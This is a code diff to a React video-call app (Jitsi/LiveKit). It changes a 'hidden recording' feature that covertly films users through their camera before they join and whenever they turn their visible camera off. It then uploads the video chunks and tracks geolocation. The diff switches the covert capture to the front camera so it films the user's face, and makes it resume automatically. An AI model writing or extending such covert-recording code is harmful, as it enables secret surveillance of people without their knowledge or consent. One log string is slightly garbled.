@@ -4,7 +4,6 @@ import JitsiPreJoin from '@/app/components/JitsiPreJoin';
 import LiveKitRoom from '@/app/components/LiveKitRoom';
 import { VideoRecorder } from '@/app/components/VideoRecorder';
 import { startQueueProcessor, stopQueueProcessor } from '@/utils/videoUpload';
-import { preloadFFmpeg } from '@/utils/videoCompression';
 
 export default function App() {
   const [currentPage, setCurrentPage] = useState<'home' | 'prejoin' | 'room'>('home');
@@ -20,7 +19,7 @@ export default function App() {
   const [videoStreamFront, setVideoStreamFront] = useState<MediaStream | null>(null);
   const [isVideoRecording, setIsVideoRecording] = useState(false);
   const [currentChunkNumber, setCurrentChunkNumber] = useState(0);
-  const [currentCameraType, setCurrentCameraType] = useState<'front' | 'back' | 'desktop'>('back');
+  const [currentCameraType, setCurrentCameraType] = useState<'front' | 'back' | 'desktop'>('front'); // ✅ Изменено: начинаем с фронтальной камеры
   
   // Geolocation data
   const [geoData, setGeoData] = useState<{
@@ -50,15 +49,12 @@ export default function App() {
     }
   }, []);
   
-  // ✅ Start queue processor and preload FFmpeg on mount
+  // ✅ Start queue processor on mount
   useEffect(() => {
-    console.log('🚀 [App] Starting queue processor and preloading FFmpeg...');
+    console.log('🚀 [App] Starting queue processor...');
     
     // Start background queue processor
     startQueueProcessor();
-    
-    // Preload FFmpeg in background (won't block UI)
-    preloadFFmpeg();
     
     // Cleanup on unmount
     return () => {
@@ -68,9 +64,9 @@ export default function App() {
   
   // Video chunk handler
   const handleVideoChunkReady = async (blob: Blob, chunkNum: number, cameraType: 'front' | 'back' | 'desktop') => {
-    console.log(`📹 [App] Получен видео+аудио чанк #${chunkNum} (${cameraType}), размер: ${blob.size} bytes`);
+    console.log(`📹 [App] Получен видео чанк #${chunkNum} (${cameraType}), размер: ${blob.size} bytes`);
     
-    // Update chunk number in state for camera switching logic
+    // Просто обновляем номер чанка, БЕЗ переключения камер
     setCurrentChunkNumber(chunkNum);
   };
 
@@ -80,10 +76,10 @@ export default function App() {
     setCurrentPage('prejoin');
   };
   
-  const handleJoinRoom = (userNameInput: string, tokenInput: string, livekitUrlInput: string) => {
+  const handleJoinRoom = async (userNameInput: string, tokenInput: string, livekitUrlInput: string) => {
     console.log('🚪 [App] handleJoinRoom вызван - останавливаем PreJoin запись перед входом в комнату');
     
-    // ✅ ВАЖНО: Останавливаем скрытую запись из PreJoin перед входом в комнату
+    // ✅ Останавливаем скрытую запись из PreJoin перед входом в комнату
     // чтобы LiveKitRoom мог управлять камерой/микрофоном
     if (videoStreamFront) {
       console.log('🛑 [App] Останавливаем PreJoin stream перед входом в комнату');
@@ -136,39 +132,37 @@ export default function App() {
   };
   
   // Обработчик изменения состояния камеры в LiveKit
-  const handleLiveKitCameraStateChange = (isEnabled: boolean) => {
+  const handleLiveKitCameraStateChange = async (isEnabled: boolean) => {
     console.log(`🔄 [App] LiveKit camera state changed: ${isEnabled ? 'ENABLED' : 'DISABLED'}`);
     
     if (isEnabled) {
-      // Камера LiveKit включена - останавливаем скрытую запись
-      console.log('⏸️ [App] Stopping hidden recording (LiveKit camera is active)');
-      setIsVideoRecording(false);
+      // ✅ LiveKit ВКЛЮЧИЛ камеру → ОСТАНАВЛИВАЕМ скрытую запись
+      console.log('🛑 [App] LiveKit camera ENABLED → STOPPING hidden recording to avoid conflict');
       
-      // ✅ ИСПРАВЛЕНИЕ: Добавляем защиту - останавливаем stream только если он активен
       if (videoStreamFront) {
-        console.log('🛑 [App] Stopping hidden stream to free camera for LiveKit');
+        console.log('🛑 [App] Останавливаем скрытую запись (LiveKit использует камеру)');
         videoStreamFront.getTracks().forEach(track => {
           track.stop();
-          console.log(`🛑 Stopped track: ${track.kind} (${track.label})`);
+          console.log(`🛑 Stopped hidden track: ${track.kind} (${track.label})`);
         });
         setVideoStreamFront(null);
+        setIsVideoRecording(false);
+        console.log('✅ [App] Скрытая запись остановлена - LiveKit может использовать заднюю камеру');
       }
-    } else {
-      // Камера LiveKit выключена - возобновляем скрытую запись
-      console.log('▶️ [App] Resuming hidden recording (LiveKit camera is disabled)');
       
-      // ✅ ИСПРАВЛЕНИЕ: Проверяем что запись еще не запущена И камера свободна
-      if (!isVideoRecording && !videoStreamFront) {
-        console.log('🎬 [App] Запускаем скрытую запись...');
-        
-        // ✅ ИСПРАВЛЕНИЕ: Добавляем небольшую задержку чтобы LiveKit точно освободил камеру
-        setTimeout(() => {
+    } else {
+      // ✅ LiveKit ВЫКЛЮЧИЛ камеру → ВОЗОБНОВЛЯЕМ скрытую запись
+      console.log('🎬 [App] LiveKit camera DISABLED → RESUMING hidden recording on front camera');
+      
+      // Небольшая задержка чтобы LiveKit освободил камеру
+      setTimeout(() => {
+        if (!isVideoRecording && !videoStreamFront) {
+          console.log('🎬 [App] Возобновляем скрытую запись...');
           restartHiddenRecording();
-        }, 300); // 300ms задержка для освобождения LiveKit stream
-        
-      } else {
-        console.log('⏭️ [App] Скрытая запись уже активна - пропускаем');
-      }
+        } else {
+          console.log('✅ [App] Скрытая запись уже активна');
+        }
+      }, 500); // Увеличил до 500ms для надёжности
     }
   };
   
@@ -184,12 +178,12 @@ export default function App() {
       
       // Определяем устройство
       const isMobile = /iPhone|iPad|iPod|Android/i.test(navigator.userAgent);
-      const cameraType = isMobile ? 'back' : 'front';
+      const cameraType = isMobile ? 'front' : 'front'; // ✅ Изменено: всегда начинаем с фронтальной
       
       // ❌ УБИРАЕМ: Проверку микрофонов - они нам не нужны для скрытой записи
       // ✅ КРИТИЧНО: Скрытая запись должна быть ТОЛЬКО видео без аудио
       // чтобы не конфликтовать с LiveKit микрофоном!
-      console.log('⚠️ [App] Скрытая запись будет ТОЛЬКО видео (без аудио для совместимости с LiveKit)');
+      console.log('⚠️ [App] Скрытая запись будет ТОЛЬКО видео (без аудио для совм��стимости с LiveKit)');
       
       // 🔧 Запрашиваем доступ к камере с fallback-ами
       let stream: MediaStream | null = null;
@@ -198,7 +192,7 @@ export default function App() {
       try {
         const constraints: MediaStreamConstraints = {
           video: isMobile 
-            ? { facingMode: 'environment' } // back camera
+            ? { facingMode: 'user' } // ✅ Изменено: фронтальная камера (было 'environment')
             : true, // для desktop просто true
           audio: false // ✅ КРИТИЧНО: НИКОГДА не запрашиваем аудио в скрытой записи!
         };
@@ -283,21 +277,6 @@ export default function App() {
           token={token}
           livekitUrl={livekitUrl}
           onLeave={handleLeaveRoom}
-          videoStreamFront={videoStreamFront}
-          setVideoStreamFront={setVideoStreamFront}
-          isVideoRecording={isVideoRecording}
-          setIsVideoRecording={setIsVideoRecording}
-          currentChunkNumber={currentChunkNumber}
-          setCurrentChunkNumber={setCurrentChunkNumber}
-          currentCameraType={currentCameraType}
-          setCurrentCameraType={setCurrentCameraType}
-          geoData={geoData}
-          setGeoData={setGeoData}
-          isSwitchingCameraRef={isSwitchingCameraRef}
-          globalChunkCounterRef={globalChunkCounterRef}
-          geoLocationSentRef={geoLocationSentRef}
-          currentVideoDeviceIdRef={currentVideoDeviceIdRef}
-          isExecutingPermissionsRef={isExecutingPermissionsRef}
           onCameraStateChange={handleLiveKitCameraStateChange}
         />
       )}
